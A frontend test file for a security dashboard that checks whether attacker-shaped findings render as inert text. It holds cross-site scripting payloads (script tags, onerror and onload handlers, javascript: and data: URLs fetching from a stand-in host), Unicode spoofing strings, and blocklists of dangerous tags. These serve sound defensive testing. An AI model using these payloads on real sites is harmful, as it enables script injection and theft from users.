// @vitest-environment jsdom
/**
 * A hostile finding renders as inert text on every screen that shows a finding
 * or its evidence (D-RF N5, the dashboard half).
 *
 * Everything a finding carries came from the target: its title, its message,
 * its evidence, where it was found. A target that knows it is being scanned can
 * shape those strings, and the console a person uses to inspect the target must
 * not become the way in. So one planted finding carries:
 *
 *   - <script> (inline and with a src), <img src=x onerror=...>, an <img> and an
 *     <iframe> that fetch from an outside host, <a href="javascript:...">, an
 *     <svg> with onload, a CSS url() in a style attribute and in a <style>, and
 *     a plain http:// link to the outside host;
 *   - a 200 KB string;
 *   - an RTL override, zero-width characters, unpaired UTF-16 surrogates and NULs;
 *
 * and is driven through the findings register (Risks), the Overview's top open
 * issues, a finding's life (the Findings page, with its evidence of a fix and its
 * checks), a scan's decisions (the retest panel), both scan screens (the engine's
 * findings and its notes), the Assurance console (the finding, its closure
 * standing, its remediation history, its incident pack and the pack's export) and
 * the four authority screens (approvals, chains, tool contracts, release gate) --
 * and, with the same planted strings, a recovery record (its incident, every
 * step, its coverage), a scan by its name in the Tests list, and a scan from the
 * record on the Engagements page.
 *
 * The finding's own URL takes three forms: an outside http:// URL, a javascript:
 * URL and a data: URL.
 *
 * On each screen:
 *   - no element of a tag the payload carries appears from it, no element carries
 *     an on* attribute, and no href is a javascript: URL;
 *   - the payload is on the screen as the characters it is, the long string in full;
 *   - every right-to-left override or zero-width character in it is drawn marked:
 *     alone in a box naming its code point (client/src/lib/hiddenChars.ts), so
 *     the text cannot read reordered or hide a character;
 *   - nothing is fetched from the outside host: fetch and XMLHttpRequest are
 *     spied, and so is every element created (an <img> or <iframe> fetches as
 *     soon as it has a src) and every innerHTML written;
 *   - nothing ran, and no window was opened;
 *   - the long string does not hang the screen: each test is bounded by its
 *     timeout, never by a wall-clock assertion.
 *
 * Where the screen shows the target's URL, it is text and never a link; where it
 * has a copy button (TargetUrl), the button writes exactly that string. The
 * findings register shows it as text with no button: its ledger is read-only and
 * holds no buttons at all (tests/the-ledger-is-labelled-by-source-and-never-
 * summed.test.tsx). And an ordinary finding renders in full, URL text and copy
 * button included (the benign control).
 */
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import type { ReactNode } from "react";
import { act, cleanup, fireEvent } from "@testing-library/react";

import AthenaScan from "@/pages/AthenaScan";
import PentestScan from "@/pages/PentestScan";
import { queryClient } from "@/lib/queryClient";
import {
  ASSURANCE_FINDING, incidentPackDownload, mountAssurance, mountFindings, mountOverview, mountRetestPanel, mountRisks, mountScan,
  mountEngagements, mountRecoveryRecords, mountScanList, recordingFetch, renderAuthorityScreens, requests, standInLayoutApis,
  type Planted,
} from "./helpers/finding-screens";

vi.mock("@/components/ui/select", async () => {
  const React = await import("react");
  const Picked = React.createContext<{ value: string; onValueChange: (value: string) => void }>({ value: "", onValueChange: () => undefined });
  return {
    Select: ({ value, onValueChange, children }: { value: string; onValueChange: (value: string) => void; children: ReactNode }) =>
      React.createElement(Picked.Provider, { value: { value, onValueChange } }, children),
    SelectTrigger: ({ children, ...props }: { children?: ReactNode } & Record<string, unknown>) => React.createElement("div", props, children),
    SelectValue: ({ placeholder }: { placeholder?: string }) => React.createElement("span", null, placeholder ?? ""),
    SelectContent: ({ children }: { children: ReactNode }) => {
      const picked = React.useContext(Picked);
      return React.createElement(
        "select", { "data-testid": "native-select", value: picked.value, onChange: (event: { target: { value: string } }) => picked.onValueChange(event.target.value) },
        React.createElement("option", { value: "" }, "—"), children,
      );
    },
    SelectItem: ({ value, children }: { value: string; children: ReactNode }) => React.createElement("option", { value }, children),
  };
});

/** The host the payload points at. Nothing may ever be fetched from it. */
const OUTSIDE = "outside-host.example";
const OUTSIDE_LINK = `http://${OUTSIDE}/collect?from=finding`;

/** Each piece would fetch from, run in, or navigate to the outside host if it were ever parsed as HTML. */
const MARKUP = [
  `<script>window.__planted = "script"</script>`,
  `<script src="http://${OUTSIDE}/s.js"></script>`,
  `<img src=x onerror="window.__planted = 'img'">`,
  `<img src="http://${OUTSIDE}/pixel.gif">`,
  `<a href="javascript:window.__planted = 'a'">open</a>`,
  `<iframe src="http://${OUTSIDE}/frame"></iframe>`,
  `<svg onload="window.__planted = 'svg'"><image href="http://${OUTSIDE}/svg.png"/></svg>`,
  `<div style="background:url(http://${OUTSIDE}/css.png)">styled</div>`,
  `<style>body { background: url('http://${OUTSIDE}/style.png') }</style>`,
  `<a href="${OUTSIDE_LINK}">${OUTSIDE_LINK}</a>`,
  OUTSIDE_LINK,
].join(" ");

/** An RTL override, zero-width characters, unpaired UTF-16 surrogates and NULs. */
const ODD = "‮gnp.exe‬ ​‌‍﻿ \uD800 \uDC00 x\uDBFFy \u0000\u0000";

const LONG = "A".repeat(200 * 1024);

/** The target's own URL for where the finding is: to the outside host, with the odd characters in it. */
const HOSTILE_URL = `${OUTSIDE_LINK}&q=‮​\u0000\uD800#<script>`;
/** And one that would run if it were ever a link's href. */
const SCRIPT_URL = `javascript:fetch('http://${OUTSIDE}/x')//‮\u0000`;
/** And one that would draw the outside host's page, script and all, if it were ever a link's href or a frame's src. */
const DATA_URL = `data:text/html;base64,${btoa(`<script src="http://${OUTSIDE}/d.js"></script>`)}#\u202E\u200B`;

const hostile = (url: string): Planted => ({ text: `${MARKUP} ${ODD}`, long: LONG, url });
const ORDINARY: Planted = {
  text: "Reflected input on /search: the q parameter is returned unescaped",
  long: "",
  url: "https://app.customer.example/search?q=1",
};

/* ---- the spies -------------------------------------------------------------------- */

const created: Element[] = [];
const htmlWritten: string[] = [];
let opened: ReturnType<typeof vi.fn>;
let writeText: ReturnType<typeof vi.fn>;

beforeAll(standInLayoutApis);

beforeEach(() => {
  requests.length = 0;
  created.length = 0;
  htmlWritten.length = 0;
  const createElement = document.createElement.bind(document);
  const createElementNS = document.createElementNS.bind(document);
  vi.spyOn(document, "createElement").mockImplementation(((tag: string, options?: ElementCreationOptions) => {
    const element = createElement(tag, options);
    created.push(element);
    return element;
  }) as typeof document.createElement);
  vi.spyOn(document, "createElementNS").mockImplementation(((ns: string | null, tag: string, options?: ElementCreationOptions) => {
    const element = createElementNS(ns, tag, options);
    created.push(element);
    return element;
  }) as typeof document.createElementNS);
  const RealImage = window.Image;
  vi.stubGlobal("Image", vi.fn(function image(width?: number, height?: number) {
    const element = new RealImage(width, height);
    created.push(element);
    return element;
  }));
  const innerHTML = Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML")!;
  vi.spyOn(Element.prototype, "innerHTML", "set").mockImplementation(function set(this: Element, value: string) {
    htmlWritten.push(String(value));
    innerHTML.set!.call(this, value);
  });
  vi.stubGlobal("XMLHttpRequest", class {
    open(method: string, url: string | URL) { requests.push({ url: String(url), method }); }
    send() {} setRequestHeader() {} abort() {} addEventListener() {} removeEventListener() {}
  });
  // Screens that read through fetch stub their own, which records the same way.
  vi.stubGlobal("fetch", recordingFetch(() => ({})));
  opened = vi.fn(() => null);
  vi.stubGlobal("open", opened);
  writeText = vi.fn(async () => undefined);
  Object.defineProperty(window.navigator, "clipboard", { value: { writeText }, configurable: true });
  delete (window as { __planted?: unknown }).__planted;
});

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  queryClient.clear();
});

/* ---- what "inert" means ----------------------------------------------------------- */

/** Tags the payload carries that no screen draws: any one on the page came from the payload. */
const NEVER_DRAWN = "script, iframe, frame, frameset, object, embed, applet, base, meta, link, style, portal";
/** Attributes through which an element fetches or navigates. */
const FETCHING = new Set(["src", "href", "xlink:href", "srcset", "srcdoc", "poster", "data", "action", "formaction", "background", "ping", "style", "lowsrc", "codebase"]);

/** A URL a browser would run: it drops C0 controls and spaces before reading the scheme, in any case. */
function runsScript(value: string): boolean {
  return /^(javascript|vbscript):/.test(value.replace(/[\u0000- ]/g, "").toLowerCase());
}

/** What on the page came from the payload, as elements and attributes. */
function payloadElements(): string[] {
  const found = Array.from(document.querySelectorAll(NEVER_DRAWN)).map((one) => `<${one.localName}>`);
  for (const element of Array.from(document.querySelectorAll("*"))) {
    for (const attribute of Array.from(element.attributes)) {
      const name = attribute.name.toLowerCase();
      if (name.startsWith("on")) found.push(`<${element.localName} ${name}>`);
      if (!FETCHING.has(name)) continue;
      if (attribute.value.includes(OUTSIDE)) found.push(`<${element.localName} ${name}> to the outside host`);
      if (runsScript(attribute.value)) found.push(`<${element.localName} ${name}> runs script`);
    }
    if (element.localName === "img" && element.getAttribute("src") === "x") found.push("<img src=x>");
  }
  return found;
}

/** Every way the page could have reached the outside host, or run the payload. */
function reachedOut(): string[] {
  const found = requests.filter((one) => one.url.includes(OUTSIDE)).map((one) => `${one.method} ${one.url}`);
  for (const element of created) {
    if (/^(script|iframe|frame|object|embed)$/.test(element.localName)) found.push(`created <${element.localName}>`);
    for (const attribute of Array.from(element.attributes)) {
      if (FETCHING.has(attribute.name.toLowerCase()) && attribute.value.includes(OUTSIDE)) found.push(`created <${element.localName} ${attribute.name}>`);
    }
  }
  for (const html of htmlWritten) if (html.includes(OUTSIDE) || /<script|onerror|onload/i.test(html)) found.push(`innerHTML ${html.slice(0, 80)}`);
  if (opened.mock.calls.length > 0) found.push(`window.open ${JSON.stringify(opened.mock.calls)}`);
  if ((window as { __planted?: unknown }).__planted !== undefined) found.push(`ran: ${String((window as { __planted?: unknown }).__planted)}`);
  return found;
}

/**
 * The characters that hide or reorder text: the bidirectional controls and the zero-width and invisible format
 * characters. Listed here on their own, not read from the component, so a character it stopped marking is caught.
 */
const HIDDEN = /[\u061C\u180E\u200B-\u200F\u202A-\u202E\u2060-\u2064\u2066-\u2069\uFEFF]/;

/**
 * Every place on the page a hidden character is drawn without its mark: a text node that holds one and is not
 * alone in its own marked box (`data-hidden-char` naming its code point, class `hidden-char`). Each would show
 * the text reordered, or with a character no one can see. (Attributes are left verbatim: client/src/lib/
 * hiddenChars.ts.)
 */
function unmarkedHidden(): string[] {
  const found: string[] = [];
  // Where it is: the element, its two parents, and the nearest test id around it.
  const where = (element: Element | null) => {
    const chain: string[] = [];
    for (let one = element; one !== null && chain.length < 3; one = one.parentElement) {
      chain.unshift(`${one.localName}${one.classList.length > 0 ? `.${Array.from(one.classList).slice(0, 2).join(".")}` : ""}`);
    }
    const named = element?.closest("[data-testid]")?.getAttribute("data-testid");
    return `${chain.join(" > ")}${named ? ` in [${named}]` : ""}`;
  };
  const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
  for (let node = walker.nextNode(); node !== null; node = walker.nextNode()) {
    const text = node.nodeValue ?? "";
    if (!HIDDEN.test(text)) continue;
    const box = node.parentElement;
    const code = `U+${text.codePointAt(0)!.toString(16).toUpperCase().padStart(4, "0")}`;
    const marked = box !== null && text.length === 1 && box.getAttribute("data-hidden-char") === code
      && box.classList.contains("hidden-char") && box.childNodes.length === 1;
    if (!marked) found.push(`${where(box)}: ${JSON.stringify(text.slice(0, 24))}`);
  }
  return found;
}

function expectInert(screen: string, planted: Planted, showsUrl: boolean) {
  expect(payloadElements(), `${screen}: elements or attributes from the payload`).toEqual([]);
  // One line each, so a failure names every place.
  expect(unmarkedHidden().join("\n"), `${screen}: a hidden or reordering character drawn without its mark`).toBe("");
  expect(reachedOut(), `${screen}: a request, an element or a script from the payload`).toEqual([]);
  // The payload is on the screen as the characters it is: escaped, never parsed, never dropped.
  const text = document.body.textContent ?? "";
  expect(text.includes(planted.text), `${screen}: the planted text, as text`).toBe(true);
  expect(text.includes(`${planted.text}${planted.long}`), `${screen}: the long string, in full`).toBe(true);
  if (showsUrl) expect(text.includes(planted.url), `${screen}: the target's URL, as text`).toBe(true);
}

/** Each copy button beside the target's URL writes exactly that URL, and nothing opens. */
async function expectUrlCopiedExactly(screen: string, url: string) {
  const shown = Array.from(document.querySelectorAll("[data-testid='target-url']"))
    .filter((one) => one.querySelector("[data-testid='text-target-url']")?.textContent === url);
  expect(shown.length, `${screen}: the target's URL as text with a copy button`).toBeGreaterThan(0);
  for (const one of shown) {
    writeText.mockClear();
    const button = one.querySelector("[data-testid='button-copy-target-url']");
    expect(button, `${screen}: a copy button beside the URL`).not.toBeNull();
    await act(async () => { fireEvent.click(button!); });
    expect(writeText.mock.calls, `${screen}: the copy writes the exact string and nothing else`).toEqual([[url]]);
  }
  const host = /^[a-z][a-z0-9+.-]*:\/\/([^/?#]+)/i.exec(url)?.[1] ?? null;
  const links = Array.from(document.querySelectorAll("a")).map((a) => a.getAttribute("href") ?? "")
    .filter((href) => href === url || (host !== null && href.includes(host)) || href.includes(OUTSIDE));
  expect(links, `${screen}: a link to the URL`).toEqual([]);
  expect(reachedOut(), `${screen}: after the copy`).toEqual([]);
}

/* ---- the screens ------------------------------------------------------------------ */

/**
 * Each screen that shows a finding or its evidence, mounted over `planted`. `url`: whether it shows the target's
 * URL as text with a copy button ("copy"), as text alone ("text": the read-only register), or not at all.
 */
const SCREENS: Array<{ name: string; url: "copy" | "text" | null; mount: (planted: Planted) => unknown }> = [
  { name: "the findings register (Risks)", url: "text", mount: mountRisks },
  { name: "the Overview's top open issues", url: null, mount: mountOverview },
  { name: "a finding's life (Findings), its evidence and its checks", url: "copy", mount: mountFindings },
  { name: "a scan's decisions (the retest panel)", url: "copy", mount: mountRetestPanel },
  { name: "the Athena scan screen", url: null, mount: (planted) => mountScan(AthenaScan, planted) },
  { name: "the Penetration testing scan screen", url: null, mount: (planted) => mountScan(PentestScan, planted) },
  { name: "the Assurance console: the finding, its closure, its history and its incident pack", url: "copy", mount: mountAssurance },
  { name: "the authority screens (approvals, chains, tool contracts, release gate)", url: null, mount: renderAuthorityScreens },
  { name: "a recovery record (its incident, every step, its coverage)", url: null, mount: mountRecoveryRecords },
  { name: "the Tests list, a scan by its name", url: null, mount: mountScanList },
  { name: "the Engagements page, a scan from the record by its target", url: "text", mount: mountEngagements },
];

// Bounded by its timeout: a screen the long string hung fails here. No wall-clock assertion.
const BOUND = 60_000;

for (const [kind, url] of [["an outside http:// URL", HOSTILE_URL], ["a javascript: URL", SCRIPT_URL], ["a data: URL", DATA_URL]] as const) {
  describe(`a hostile finding, whose own URL is ${kind}, renders as inert text`, () => {
    for (const one of SCREENS) {
      it(`on ${one.name}`, async () => {
        const planted = hostile(url);
        await one.mount(planted);
        expectInert(one.name, planted, one.url !== null);
      }, BOUND);

      if (one.url === "copy") {
        it(`on ${one.name}, its URL is text and the copy writes exactly that string`, async () => {
          await one.mount(hostile(url));
          await expectUrlCopiedExactly(one.name, url);
        }, BOUND);
      }
    }
  });
}

describe("the incident pack's export carries the hostile finding as data, never as a page", () => {
  it("downloads the pack as JSON with every string intact, through a blob URL, and attaches nothing", async () => {
    const blobs: Blob[] = [];
    const clicked: HTMLAnchorElement[] = [];
    Object.defineProperty(URL, "createObjectURL", { value: vi.fn((blob: Blob) => { blobs.push(blob); return "blob:http://localhost/pack"; }), configurable: true });
    Object.defineProperty(URL, "revokeObjectURL", { value: vi.fn(), configurable: true });
    vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(function click(this: HTMLAnchorElement) { clicked.push(this); });
    try {
      const planted = hostile(HOSTILE_URL);
      const { pack } = await mountAssurance(planted);
      await act(async () => { fireEvent.click(incidentPackDownload()); });

      expect(clicked).toHaveLength(1);
      expect(clicked[0].getAttribute("href")).toBe("blob:http://localhost/pack");
      expect(clicked[0].download).toBe(`incident-pack-${ASSURANCE_FINDING}.json`);
      expect(clicked[0].isConnected, "the download link is never put on the page").toBe(false);
      expect(blobs).toHaveLength(1);
      expect(blobs[0].type).toBe("application/json");
      const text = await new Promise<string>((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(String(reader.result));
        reader.onerror = () => reject(reader.error);
        reader.readAsText(blobs[0]);
      });
      // Every string as served, the unpaired surrogates and NULs included (JSON escapes them).
      expect(JSON.parse(text)).toEqual(pack);
      expect(payloadElements()).toEqual([]);
      expect(reachedOut()).toEqual([]);
    } finally {
      delete (URL as { createObjectURL?: unknown }).createObjectURL;
      // Left as a no-op, not removed: the download's revoke runs a minute after it (lib/appFile.ts revokeBlobUrlLater).
      Object.defineProperty(URL, "revokeObjectURL", { value: () => undefined, configurable: true });
    }
  }, BOUND);
});

describe("an ordinary finding renders in full on every screen (the benign control)", () => {
  for (const one of SCREENS) {
    it(`on ${one.name}${one.url === "copy" ? ", its URL as text with a copy button" : one.url === "text" ? ", its URL as text" : ""}`, async () => {
      await one.mount(ORDINARY);
      expect((document.body.textContent ?? "").includes(ORDINARY.text), `${one.name}: the finding's text`).toBe(true);
      if (one.url !== null) expect((document.body.textContent ?? "").includes(ORDINARY.url), `${one.name}: the URL`).toBe(true);
      if (one.url === "copy") await expectUrlCopiedExactly(one.name, ORDINARY.url);
      expect(reachedOut()).toEqual([]);
    }, BOUND);
  }
});
